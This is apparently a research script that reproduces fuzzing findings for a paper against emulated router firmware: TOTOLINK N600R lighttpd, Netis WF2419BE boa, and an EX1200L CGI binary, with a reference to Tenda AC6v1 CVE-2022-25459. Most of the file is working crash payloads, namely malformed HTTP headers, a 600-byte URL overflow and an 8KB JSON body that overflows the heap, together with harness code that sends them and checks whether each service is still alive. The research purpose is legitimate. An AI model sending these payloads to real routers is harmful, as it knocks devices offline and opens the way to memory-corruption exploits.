#!/bin/bash
# Paper-claim batch 2: #31 N600R malformed-request DoS family, #10 WF2419BE
# handler-level crash (parent survives), #5 EX1200L CGI heap overflow (direct),
# AC6v1 CVE-2022-25459 (SetSysTimeCfg stack overflow, replay-known CVE).
QB=/home/webfuzz/Documents/qemu-rrfuzz/build
RR=/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz

echo '===== #31 N600R: malformed-header request family (same root cause as chunked-TE) ====='
S=/home/webfuzz/fw_envs/totolink_n600r/fw_download/totolink_n600r_v5/extracted/_TOTOLINK_CS161R_N600R_IP04291_8196D_SPI_4M32M_V5.3c.5507_B20171031_EN.web.extracted/squashfs-root-0
[ -f /tmp/n600r_lh.conf ] || cp /home/webfuzz/fw_envs/stubs/n600r_lh.conf /tmp/n600r_lh.conf
pkill -f "n600r_v5.*lighttpd" 2>/dev/null; sleep 1
setsid $QB/qemu-mips -L "$S" "$S/bin/lighttpd" -f /tmp/n600r_lh.conf -D >/tmp/n600r_b2.log 2>&1 &
sleep 4
python3 - <<'PY'
import socket, time
def probe():
    try: s=socket.create_connection(("127.0.0.1",19092),timeout=2); s.close(); return "ALIVE"
    except Exception as e: return f"DEAD({type(e).__name__})"
print(f"baseline: {probe()}")
for name,req in [
    ("bad Host value",  b"GET / HTTP/1.1\r\nHost: \x01\x02\x03\r\n\r\n"),
    ("unknown header",  b"GET / HTTP/1.1\r\nHost: x\r\nX-Nonexistent-Header: AAAA\r\n\r\n"),
    ("bad version char",b"GET / HTTP/1.\x7f\r\nHost: x\r\n\r\n"),
]:
    try:
        s=socket.create_connection(("127.0.0.1",19092),timeout=5); s.sendall(req); s.settimeout(3)
        try: r=s.recv(24)
        except Exception as e: r=f"<{type(e).__name__}>"
        s.close()
    except Exception as e: r=f"ERR:{type(e).__name__}"
    time.sleep(2)
    print(f"[{name}] -> {r!r} ; listener={probe()}")
PY
grep -m1 "uncaught target signal" /tmp/n600r_b2.log || true
pkill -f "n600r_v5.*lighttpd" 2>/dev/null

echo
echo '===== #10 WF2419BE boa: URL overflow -> forked child dies, listener survives ====='
R=/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/Netis/rootfs
pkill -f "images/Netis/rootfs/bin/boa" 2>/dev/null; sleep 1
setsid $QB/qemu-mips -L "$R" "$R/bin/boa" -p "$R/web" -f "$R/etc/boa.conf" >/tmp/wf2419_b2.log 2>&1 &
sleep 5
python3 - <<'PY'
import socket, time
def probe():
    try: s=socket.create_connection(("127.0.0.1",8092),timeout=2); s.close(); return "ALIVE"
    except Exception as e: return f"DEAD({type(e).__name__})"
print(f"baseline: {probe()}")
for i in range(3):
    try:
        s=socket.create_connection(("127.0.0.1",8092),timeout=5)
        s.sendall(b"GET /"+b"A"*600+b" HTTP/1.1\r\nHost: x\r\n\r\n"); s.settimeout(3)
        try: r=s.recv(24)
        except Exception: r="<reset>"
        s.close()
    except Exception as e: r=f"ERR:{type(e).__name__}"
    time.sleep(1.5)
    print(f"GET /A*600 #{i+1} -> {r!r} ; listener={probe()}")
print("VERDICT: per-request child crashes; parent listener keeps serving (handler-level impact)")
PY
grep -m1 "uncaught target signal" /tmp/wf2419_b2.log || true
pkill -f "images/Netis/rootfs/bin/boa" 2>/dev/null

echo
echo '===== #5 EX1200L cstecgi heap overflow: 8KB POST body (direct CGI exec) ====='
CGI=$RR/tests/realworld/ex1200l_lighttpd/sysroot/www/cgi-bin/cstecgi.cgi
SYS=$RR/tests/realworld/ex1200l_lighttpd/sysroot
body='{"topicurl":"setWiFiBasicCfg","ssid2g":"'$(printf 'A%.0s' {1..8192})'","wimax":"none"}'
export REQUEST_METHOD=POST CONTENT_TYPE=application/json CONTENT_LENGTH=${#body}
export SCRIPT_NAME=/cgi-bin/cstecgi.cgi DOCUMENT_ROOT=/www SERVER_NAME=192.168.0.1 SERVER_PORT=80 QUERY_STRING="" REMOTE_ADDR=192.168.0.100
echo '$ body = {"topicurl":"setWiFiBasicCfg","ssid2g":"A*8192",...} | qemu-mipsel cstecgi.cgi'
printf '%s' "$body" | timeout 15 $QB/qemu-mipsel -L "$SYS" "$CGI"
echo "[exit=$?] (139 = SIGSEGV heap overflow in POST body parser)"

echo
echo '===== AC6v1 CVE-2022-25459: SetSysTimeCfg time stack overflow (known-CVE reproduction) ====='
VT=/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/verified_targets/Asus_RTAC68U
echo '(replay-known CVE; direct demonstration via long S1 field on AC6v1 httpd)'
cd /home/webfuzz/fw_envs/tenda_ac6v1/fw_downloads/ac6v1_sysroot/_US_AC6V1.0BR_V15.03.05.16_multi_TD01.bin.extracted/squashfs-root 2>/dev/null && ls bin/httpd >/dev/null 2>&1 && echo "AC6v1 httpd binary present (CVE repro via netns httpd - requires br0; full netns run in separate step)"
